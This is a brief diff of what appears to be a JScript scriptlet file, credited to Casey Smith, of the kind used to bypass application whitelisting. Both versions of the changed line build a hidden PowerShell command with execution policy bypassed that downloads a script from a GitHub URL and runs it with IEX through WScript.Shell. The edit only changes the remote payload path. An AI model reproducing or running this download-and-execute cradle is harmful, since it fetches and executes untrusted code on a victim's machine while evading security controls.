@@ -6,7 +6,7 @@
 	<!-- Learn from Casey Smith @subTee -->
 	<script language="JScript">
 		<![CDATA[
-			rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/HackTip/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe')";
+			rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')";
 		new ActiveXObject("WScript.Shell").Run(rat,0,true);
 	
 		]]>
